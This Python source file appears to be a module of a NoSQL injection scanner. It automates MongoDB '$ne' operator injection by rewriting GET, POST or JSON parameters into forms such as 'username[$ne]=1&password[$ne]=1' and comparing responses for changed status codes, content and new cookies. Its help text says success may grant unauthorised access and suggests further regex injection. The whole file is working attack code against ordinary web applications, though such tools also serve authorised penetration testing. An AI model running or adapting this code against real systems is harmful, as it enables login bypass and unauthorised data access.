import copy;
import difflib;
from util.output import verbose;
from util.output import success;
from util.output import failure;
from util.output import info;
from util.output import bold;

import threading;
from itertools import combinations;

class NotEqualsArrayInjection:

    def doc(self):
        bold("--Description--");
        print("Attempts to send an array with a not-equal parameter instead of single values via \
post/get requests.");
        print("");
        bold("--How it works--");
        print("For example, if your request data was ?search=stuff, where search was your vulnerable \
parameter, then this module will attempt to send ?search[$ne]=1 instead. MongoDB will then \
parse this as 'if entry is not equal to 1', and return found entries. If this module is \
successful, it is recommended to perform manual injection with this method. It may give you \
unauthorised access.");
        bold("--Output--");
        print("This module will attempt to track differences in website content, status code, \
and cookies. If a difference is detected, the difference will be displayed in console.");
        bold("--Extra Notes--");
        print("This module will try different combinations of parameters with the [$ne] addition \
in order to figure out what combination will yield the best outcome.");
        print("E.g. Your test data is 'username=1&password=1'. For the parameter username, the \
program will try: 'username[$ne]=1&password=1' and 'username[$ne]=1&password[$ne]=1'.");
        

    def getID(self):
        return 0;
        
    def getType(self):
        return "a";
        
    def __init__(self,url,param,scanner):
        self.url = url;
        self.param = param;
        self.scanner = scanner;
        self.workingCombinations = [];

    def vulnTest(self):
        for data in self.getDataLists():
            verbose("Testing ne combination " + str(data));
            req = self.scanner.sendData(data);
            check = self.scanner.check(req);
            if check != "none":
                verbose(check+" has changed!");
                if data not in self.workingCombinations:
                    self.workingCombinations.append(data);

        if len(self.workingCombinations) > 0:
            return True;
        return False;

    def getDataLists(self):
        dataList = [];
        dataParams = copy.deepcopy(self.scanner.data).keys();
        dataList.append(self.scanner.data);
        for i in range(1,len(dataParams)+1):
            ways = combinations(dataParams,i);
            
            for way in ways:
                if self.param not in way:
                    continue;
                
                data = copy.deepcopy(self.scanner.data);
                for param in way:
                    if self.scanner.method != "json": #GET/POST, send PHP array
                        val = data.pop(param);
                        data[param+"[$ne]"] = val;
                    else: #JSON data. Direct modification
                        data[param] = {"$ne":data.get(param)};
                if data in dataList:
                    continue;
                dataList.append(data);
        return dataList;
                

    def grabData(self):
        req1 = self.scanner.sendData(self.scanner.data);
        results = [];
        for data in self.workingCombinations:
            results.append("");
            results.append("For payload: " + self.scanner.implodeData(data));
            results.append("");
            req2 = self.scanner.sendData(data);
            if req1.status_code != req2.status_code:
                change = str(req1.status_code) + " => " + str(req2.status_code);
                results.extend(["Status code with the injection is different!",change]);
                results.append("");
                
            elif req1.text != req2.text:
                diff = difflib.unified_diff(req1.text, req2.text)
                new = "";
                for item in diff:
                    if item.startswith("+"):
                        if len(item) > 2:
                            continue;
                        new += item[1];
                if new.strip() != "":
                    results.extend(["Content Difference:"] + [new]);
                    results.append("");
            if req1.cookies != req2.cookies:
                cookies = [];
                oldCookies = req1.cookies.get_dict();
                for key in req2.cookies.get_dict():
                    if key in oldCookies:
                        if oldCookies[key] == req2.cookies.get_dict()[key]:
                            continue;
                    cookies.append(key+" : "+req2.cookies.get_dict()[key]);

                if len(cookies) > 0:
                    results.extend(["New Cookies:"]+cookies);
                    results.append("");
                    
        if len(results) == 3*len(self.workingCombinations):
            failure("All combinations failed to retrieve data!");
            return None;
        
        #success("[$ne] injection was a success! Be sure to customise the parameters to attempt regex injection.");
        
        return results;
            
    
